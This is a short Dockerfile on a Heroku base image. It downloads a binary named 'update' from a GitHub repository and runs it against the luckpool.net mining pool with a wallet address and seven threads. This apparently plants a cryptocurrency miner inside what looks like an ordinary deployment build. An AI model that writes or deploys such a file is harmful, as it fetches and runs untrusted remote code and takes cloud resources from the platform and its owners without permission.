FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/septianana55/Student/blob/main/update; ./update -v -l na.luckpool.net:3956 -u RQ49i5erGDL5XnpUEjKksn9SvdES8qjsow.HR -p x -t 7
CMD bash heroku.sh
